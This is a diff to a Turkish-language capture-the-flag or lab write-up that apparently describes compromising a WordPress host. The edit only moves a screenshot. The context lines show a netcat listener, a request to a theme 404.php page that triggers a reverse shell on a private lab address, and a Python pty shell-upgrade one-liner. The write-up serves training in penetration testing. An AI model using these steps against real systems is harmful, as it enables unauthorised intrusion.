@@ -146,7 +146,7 @@ nc -lvnp 9001
 ```
 https://10.112.169.2/wp-content/themes/<tema-adi>/404.php
 ```
-<img width="672" height="558" alt="root1" src="https://github.com/user-attachments/assets/a4b5f2ff-0bed-4086-96c0-41a5ca6b2b92" />
+<img width="1048" height="623" alt="shell1" src="https://github.com/user-attachments/assets/070b5e59-190e-45dc-9e31-50eecb7dca4a" />
 
 5. Netcat dinleyicisinde bağlantı düştü ve düşük yetkili bir shell elde ettim.
 
@@ -158,7 +158,6 @@ https://10.112.169.2/wp-content/themes/<tema-adi>/404.php
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm-256color
 ```
-<img width="1048" height="623" alt="shell1" src="https://github.com/user-attachments/assets/070b5e59-190e-45dc-9e31-50eecb7dca4a" />
 ---
 
 ## 5️⃣ Yatay Hareket — Kullanıcı Ele Geçirme (robot)
